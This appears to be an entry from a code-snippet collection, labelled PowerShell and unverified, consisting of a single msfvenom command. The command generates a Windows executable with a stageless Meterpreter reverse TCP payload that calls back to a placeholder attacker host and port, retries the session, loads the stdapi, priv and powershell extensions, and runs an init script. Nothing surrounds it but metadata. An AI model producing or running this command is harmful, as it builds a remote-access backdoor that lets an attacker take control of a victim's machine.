---
id: 53bbe5da-18eb-4b34-99f0-fe7af2513833
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.692257+00:00'
updated_at: '2023-04-10T20:24:56.685165+00:00'
---

# Code Snippet 53bbe5da

**Language**: Powershell

```powershell
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```


